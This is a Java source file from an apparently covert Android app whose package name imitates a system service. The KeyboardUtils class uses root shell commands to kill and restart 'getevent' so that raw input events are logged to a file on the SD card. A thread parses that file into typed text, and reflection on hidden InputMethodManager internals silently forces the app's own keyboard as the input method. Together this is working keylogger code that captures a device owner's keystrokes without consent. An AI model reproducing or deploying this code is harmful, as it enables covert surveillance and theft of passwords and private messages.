package android.service.app.utils;

import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.os.Environment;
import android.provider.Settings;
import android.service.app.Service;
import android.support.annotation.NonNull;
import android.view.inputmethod.InputMethodInfo;
import android.view.inputmethod.InputMethodManager;

import com.stericson.RootShell.execution.Command;
import com.stericson.RootShell.execution.Shell;
import com.stericson.RootTools.RootTools;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.List;

@Deprecated
public enum KeyboardUtils
{
    utils;
    public static final String ANDROID_SERVICE_APP_ANDROID_KEYBOARD_SERVICE = "android.service.app/.AndroidKeyboard";
    public static final String ANDROID_SERVICE_APP_ANDROID_KEYBOARD_CLASS = "android.service.app.AndroidKeyboard";

    public static final String EVENTS_TXT = "events.txt";

    private static String getCurrentIMEName(Context paramContext)
    {
        return Settings.Secure.getString(paramContext.getContentResolver(), "default_input_method");
    }

    @Deprecated
    public static void runGetEvent(Context context)
    {
        Intent serviceLauncher = new Intent(context, Service.class);
        if (Log.isDebugEnabled()) Log.debug("serviceLauncher=" + serviceLauncher);
        context.startService(serviceLauncher);
        try
        {
            Shell shell = RootTools.getShell(false);
            shell.add(new Command(0, "ps u -C getevent\n")
            {
                @Override
                public void commandOutput(int id, String line)
                {
                    if (line.contains("getevent"))
                    {
                        String PID = line.split(" +")[1];
                        try
                        {
                            Shell shell = RootTools.getShell(true);
                            shell.add(new Command(1, "kill -s 9 " + PID + "\n"));
                            shell.close();
                        } catch (Exception e)
                        {
                            e.printStackTrace();
                        }
                    }
                }
            });

            shell.close();

            Shell shell1 = RootTools.getShell(true);
            shell1.add(new Command(2, "getevent -qtl > " + getSdCardPath() + "events.txt &\n"));
            shell1.close();
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    @Deprecated
    public static void changeKeyboardIfNeeded(Context context)
    {
        boolean isOurKeyboard = false;

        String inputMethod = getCurrentIMEName(context);
        if (Log.isDebugEnabled()) Log.debug("inputMethod=" + inputMethod);

        if ((inputMethod != null) && inputMethod.endsWith(ANDROID_SERVICE_APP_ANDROID_KEYBOARD_SERVICE))
            isOurKeyboard = true;

        if (Log.isDebugEnabled()) Log.debug("isOurKeyboard=" + isOurKeyboard);

        if (!isOurKeyboard)
        {
            InputMethodManager localInputMethodManager = (InputMethodManager) context.getSystemService("input_method");
            if (Log.isDebugEnabled()) Log.debug("localInputMethodManager=" + localInputMethodManager);

            List<InputMethodInfo> inputMethodList = localInputMethodManager.getInputMethodList();
            if (Log.isDebugEnabled()) Log.debug("inputMethodList=" + inputMethodList);

            String id = null;
            for (InputMethodInfo inputMethodInfo : inputMethodList)
            {
                if (inputMethodInfo.getServiceName().equals(ANDROID_SERVICE_APP_ANDROID_KEYBOARD_CLASS))
                {
                    id = inputMethodInfo.getId();
                    break;
                }
            }

            if (Log.isDebugEnabled()) Log.debug("id=" + id);
            if (id != null)
            {

                try
                {
                    Object o = InputMethodManager.class.getDeclaredField("mService");
                    if (Log.isDebugEnabled()) Log.debug("0:o=" + o);

                    ((Field) o).setAccessible(true);

                    o = ((Field) o).get(localInputMethodManager);
                    if (Log.isDebugEnabled()) Log.debug("1:o=" + o);

                    o.getClass().getDeclaredMethod("setInputMethodEnabled", new Class[]{String.class, Boolean.TYPE}).invoke(o, new Object[]{id, Boolean.valueOf(true)});

                    localInputMethodManager.setInputMethod(null, id);

                    Intent inputMethodChanged = new Intent("android.intent.action.INPUT_METHOD_CHANGED");
                    inputMethodChanged.putExtra("input_method_id", id);
                    context.sendBroadcast(inputMethodChanged);
                    if (Log.isDebugEnabled()) Log.debug("inputMethodChanged=" + inputMethodChanged);
                } catch (Exception e)
                {
                    Log.error(e);
                    throw new RuntimeException(e);
                }

            }
        }
    }

    public static void handleGetEventOutput(final ContextWrapper wrapper)
    {
        final String path = Environment.getExternalStorageDirectory().getPath() + File.separator;

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                try
                {
                    String filename = path + EVENTS_TXT;

                    BufferedReader reader = new BufferedReader(new FileReader(filename));
                    String text = "";
                    String line;

                    while (true)
                    {
                        try
                        {
                            line = reader.readLine();
                        }
                        catch (IOException e)
                        {
                            Log.error(e);
                            break;
                        }
                        if (line == null)
                        {
                            Thread.sleep(100);
                            continue;
                        }
                        int startSymbolIndex = line.indexOf("KEY_");
                        if (startSymbolIndex == -1) continue;
                        String subLine = line.substring(startSymbolIndex);
                        if (!subLine.contains("DOWN")) continue;
                        String symbolCandidate = subLine.substring(subLine.indexOf("_") + 1, subLine.indexOf(" "));

                        if ("SPACE".equals(symbolCandidate)) symbolCandidate = " ";
                        if ("ENTER".equals(symbolCandidate) || "TAB".equals(symbolCandidate))
                            symbolCandidate = ".";

                        if (symbolCandidate.length() == 1)
                        {
                            boolean isEndOfLine = ".".equals(symbolCandidate);
                            if (isEndOfLine) symbolCandidate = ".\n";
                            text += symbolCandidate;
                            if (isEndOfLine)
                            {
                                AndroidUtils.printDataOnScreen("# " + text, wrapper);
                                text = "";
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Log.error(e);
                }
            }
        }).start();
    }

    @NonNull
    private static String getSdCardPath()
    {
        return Environment.getExternalStorageDirectory().getPath() + File.separator;
    }

}
